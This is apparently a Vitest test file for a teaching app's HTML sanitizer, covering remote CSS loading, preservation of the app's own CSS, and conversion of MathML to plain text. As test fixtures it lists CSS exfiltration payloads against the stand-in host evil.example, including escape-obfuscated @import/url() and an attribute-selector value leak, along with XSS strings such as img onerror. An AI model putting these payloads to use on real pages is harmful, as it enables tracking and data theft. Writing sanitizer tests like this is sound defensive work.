// The host's HTML cleaner lets CSS style but not fetch, and shows MathML as readable text.
//
// WHY (2026-11-17): sanitizeHtml (AlloFlowANTI.txt) cleans HTML that comes from
// AI output and from student files before it is put into the teacher's page.
//  - A <style> block or style attribute could load a remote file with @import
//    or url(). That is a tracking beacon, and with attribute selectors it can
//    read values off the page. <style> itself has to stay: the app's own lesson
//    HTML carries its layout in <style> blocks and passes through this cleaner.
//  - <math> was deleted outright, so "Area: 1/2 done" read "Area:  done".
//    Its raw text is no better (one half reads "12"), so the common forms are
//    written out and anything else shows "[math]".
import { beforeAll, describe, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { sliceBetween } from './helpers/anchored_slice.js';
import { loadAlloModule } from './setup.js';

const require = createRequire(import.meta.url);

// SANITIZE_ANTI points the test at another copy of the host file (to see it fail on an old one).
const ANTI = readFileSync(resolve(process.cwd(), process.env.SANITIZE_ANTI || 'AlloFlowANTI.txt'), 'utf8');
const BLOCK = sliceBetween(ANTI, '// __ALLO_SANITIZE_HTML_BEGIN__', '// __ALLO_SANITIZE_HTML_END__', { file: 'AlloFlowANTI.txt' });
// eslint-disable-next-line no-new-func
const sanitizeHtml = new Function('DOMParser', BLOCK + '\nreturn sanitizeHtml;')(globalThis.DOMParser);
const B = '\\'; // one backslash, as CSS escapes are written

describe('CSS cannot load anything remote', () => {
  const HOST = 'evil.example';
  const attacks = [
    `<style>@import url(https://${HOST}/a.css);.x{color:red}</style>`,
    `<style>@import "https://${HOST}/a.css";.x{color:red}</style>`,
    `<style>@IMPORT 'https://${HOST}/a.css' screen;.x{color:red}</style>`,
    `<style>@${B}69mport "https://${HOST}/a.css";.x{color:red}</style>`,
    `<style>@${B}69 mport "https://${HOST}/a.css";.x{color:red}</style>`,
    `<style>@${B}i${B}mport "https://${HOST}/a.css";.x{color:red}</style>`,
    `<style>.x{color:red;background:url(https://${HOST}/b.gif)}</style>`,
    `<style>.x{color:red;background:URL( "https://${HOST}/b.gif" )}</style>`,
    `<style>.x{color:red;background:url(//${HOST}/b.gif)}</style>`,
    `<style>.x{color:red;background:u${B}72l(https://${HOST}/b.gif)}</style>`,
    `<style>.x{color:red;background:${B}75${B}72${B}6c(https://${HOST}/b.gif)}</style>`,
    `<style>.x{color:red;background:url("x)url(https://${HOST}/b.gif)")}</style>`,
    `<style>.x{color:red;background:image-set("https://${HOST}/b.png" 1x)}</style>`,
    `<style>.x{color:red;background:-webkit-image-set("https://${HOST}/b.png" 1x)}</style>`,
    `<style>.x{color:red;background:image("https://${HOST}/b.png")}</style>`,
    `<style>.x{color:red;background:image${B}2d set("https://${HOST}/b.png" 1x)}</style>`,
    `<style>.x{color:red;background:image${B}-set("https://${HOST}/b.png" 1x)}</style>`,
    `<style>@import url('https://${HOST}/css2?family=A:wght@400;600&display=swap');.x{color:red}</style>`,
    `<style>.x{color:red}@import "https://${HOST}/a.css</style>`,
    `<style>input[value^="a"]{background:url(https://${HOST}/leak?a)}.x{color:red}</style>`,
    `<style>@font-face{font-family:f;src:url(https://${HOST}/f.woff2)}.x{color:red}</style>`,
  ];
  for (const html of attacks) {
    it(html.slice(7, 70), () => {
      const out = sanitizeHtml(html);
      expect(out).not.toContain(HOST);
      expect(out).not.toMatch(/@import/i);
      // The block and its harmless rule survive.
      expect(out).toMatch(/^<style>[\s\S]*<\/style>$/);
      expect(out).toContain('color:red');
    });
  }

  it('cleans a style attribute the same way and keeps the rest of it', () => {
    const out = sanitizeHtml(`<p style="color:red;background:url(https://${HOST}/c.gif)">x</p>`);
    expect(out).not.toContain(HOST);
    expect(out).toContain('color:red');
    expect(out).toContain('>x</p>');
  });

  it('does not turn an escaped backslash into an import', () => {
    // "\\69mport" is a literal backslash then "69mport": an unknown rule that loads nothing.
    // Decoding the "\69" here would write "@\import", which a browser reads as @import.
    const html = `<style>@${B}${B}69mport "x.css";</style>`;
    expect(sanitizeHtml(html)).toBe(html);
  });
});

describe('ordinary CSS is left exactly as it was', () => {
  const keep = [
    '<style>.x{color:red}</style><p class="x">Hi</p>',
    '<span style="color:#b91c1c">red</span>',
    '<style>.x{background:url(data:image/png;base64,iVBORw0KGgo=)}</style>',
    '<style>.x{background:url("data:image/png;base64,iVBORw0KGgo=")}</style>',
    '<style>.x{fill:url(#grad);background-image:linear-gradient(#fff,#000);image-rendering:pixelated}</style>',
    `<style>.md${B}:flex{display:flex}.ok::before{content:"${B}2713"}.nl::after{content:"${B}a "}</style>`,
    '<style>@media print{.no-print{display:none!important}}@page{margin:1in}</style>',
    '<style>@font-face{font-family:f;src:url(data:font/woff2;base64,AAAA)}</style>',
  ];
  for (const html of keep) {
    it(html.slice(0, 70), () => {
      expect(sanitizeHtml(html)).toBe(html);
    });
  }

});

// The teacher dashboard's student-work report and the blueprint step preview run
// the app's own lesson HTML through this cleaner, so its layout CSS must survive.
// The exported pack's stylesheet (about 130 KB) is the widest real sample of it.
describe('the CSS the app itself writes passes through unchanged', () => {
  let pipeline;
  beforeAll(() => {
    const React = require(resolve(process.cwd(), 'desktop/web-app/node_modules/react'));
    globalThis.React = window.React = React;
    loadAlloModule('text_pipeline_helpers_module.js');
    loadAlloModule('doc_pipeline_module.js');
    const stub = async () => '';
    pipeline = window.AlloModules.createDocPipeline({
      callGemini: stub, callGeminiVision: stub, callImagen: async () => null, addToast: () => {},
      t: (key, fallback) => (typeof fallback === 'string' ? fallback : key), isRtlLang: () => false,
      updateExportPreview: () => {}, getDefaultTitle: (type) => String(type || 'Resource'),
      state: { history: [], exportConfig: { audience: 'student', includeTeacherKey: false, annotations: [] } },
    });
  }, 60000);
  const ITEMS = [
    { id: 'math', type: 'math', title: 'Equations', data: { problems: [{ question: 'Solve 2x = 10', answer: '5', steps: ['Divide by 2'], realWorld: 'Pies.' }] } },
    { id: 'storm', type: 'brainstorm', title: 'Ideas', data: [{ title: 'Build a model', description: 'Use clay.', connection: 'Shows layers.' }] },
  ];
  const styleBlocks = (html) => [...html.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/g)].map(m => m[1]);
  const quiet = (fn) => { const log = console.log; console.log = () => {}; try { return fn(); } finally { console.log = log; } };

  it('an exported pack\'s stylesheets', () => {
    const blocks = styleBlocks(quiet(() => pipeline.generateFullPackHTML(ITEMS, 'Pack', false, {}, { includeMath: true, annotations: [] })));
    expect(blocks.length).toBeGreaterThan(0);
    expect(blocks.join('').length).toBeGreaterThan(50000);
    for (const css of blocks) {
      const html = '<style>' + css + '</style>';
      const out = sanitizeHtml(html);
      expect(out.length, css.slice(0, 60)).toBe(html.length);
      expect(out === html, css.slice(0, 60)).toBe(true);
    }
  });

  it('each resource\'s own HTML, as the teacher dashboard and blueprint preview pass it', () => {
    for (const item of ITEMS) {
      const html = quiet(() => pipeline.generateResourceHTML(item, true, {}, { isWorksheet: false })) || '';
      expect(html.length, item.type).toBeGreaterThan(0);
      const before = styleBlocks(html);
      const after = styleBlocks(sanitizeHtml(html));
      expect(after, item.type).toEqual(before);
    }
  });
});

describe('MathML is shown as readable text', () => {
  const m = (inner) => sanitizeHtml('<math>' + inner + '</math>');
  const cases = [
    ['a fraction', '<mfrac><mn>1</mn><mn>2</mn></mfrac>', '1/2'],
    ['plain text in the tag', '1/2', '1/2'],
    ['a power', '<msup><mi>x</mi><mn>2</mn></msup>', 'x^2'],
    ['a subscript', '<msub><mi>x</mi><mn>1</mn></msub>', 'x_1'],
    ['a subscript and a power', '<msubsup><mi>x</mi><mn>1</mn><mn>2</mn></msubsup>', 'x_1^2'],
    ['a square root', '<msqrt><mn>2</mn></msqrt>', '√2'],
    ['a square root of a sum', '<msqrt><mi>x</mi><mo>+</mo><mn>1</mn></msqrt>', '√(x+1)'],
    ['a cube root', '<mroot><mi>x</mi><mn>3</mn></mroot>', 'x^(1/3)'],
    ['a sum over a number', '<mfrac><mrow><mi>a</mi><mo>+</mo><mi>b</mi></mrow><mn>2</mn></mfrac>', '(a+b)/2'],
    ['a power of a fraction', '<msup><mfrac><mn>1</mn><mn>2</mn></mfrac><mn>2</mn></msup>', '(1/2)^2'],
    ['a mixed number, never "11/2"', '<mn>1</mn><mfrac><mn>1</mn><mn>2</mn></mfrac>', '1 1/2'],
    ['a fraction times a letter', '<mfrac><mn>1</mn><mn>2</mn></mfrac><mi>x</mi>', '1/2 x'],
    ['an equation', '<mrow><mi>y</mi><mo>=</mo><mfrac><mn>3</mn><mn>4</mn></mfrac></mrow>', 'y=3/4'],
    ['source spacing between tags', '\n  <mrow>\n    <mn> 3 </mn>\n    <mo>+</mo>\n    <mn>4</mn>\n  </mrow>\n', '3+4'],
    ['words kept with their spaces', '<mi>x</mi><mtext> and </mtext><mi>y</mi>', 'x and y'],
    ['brackets', '<mfenced><mi>a</mi><mi>b</mi></mfenced>', '(a, b)'],
    ['an annotated expression', '<semantics><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x+1</annotation></semantics>', 'x+1'],
    ['a table it cannot write out', '<mtable><mtr><mtd><mn>1</mn></mtd><mtd><mn>2</mn></mtd></mtr></mtable>', '[math]'],
    ['a stacked form it cannot write out', '<munder><mo>lim</mo><mi>x</mi></munder>', '[math]'],
    ['a fraction with a part missing', '<mfrac><mn>1</mn></mfrac>', '[math]'],
  ];
  for (const [label, inner, text] of cases) {
    it(label + ': ' + text, () => {
      expect(m(inner)).toBe(text);
    });
  }

  it('keeps the sentence around it', () => {
    expect(sanitizeHtml('<p>Area: <math><mfrac><mn>1</mn><mn>2</mn></mfrac></math> done</p>')).toBe('<p>Area: 1/2 done</p>');
  });

  it('still removes markup hidden inside math, and writes text as text', () => {
    expect(sanitizeHtml('<p>Ok</p><math><mtext><img src=x onerror=alert(1)></mtext></math>')).toBe('<p>Ok</p>');
    const mixed = sanitizeHtml('<p>Ok</p><math><mi>x</mi><mtext><img src=x onerror=alert(1)></mtext></math>');
    expect(mixed).toBe('<p>Ok</p>[math]');
    expect(m('<mi>&lt;script&gt;alert(1)&lt;/script&gt;</mi>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(m('<a xlink:href="javascript:alert(1)">x</a>')).not.toMatch(/<|javascript/);
  });
});
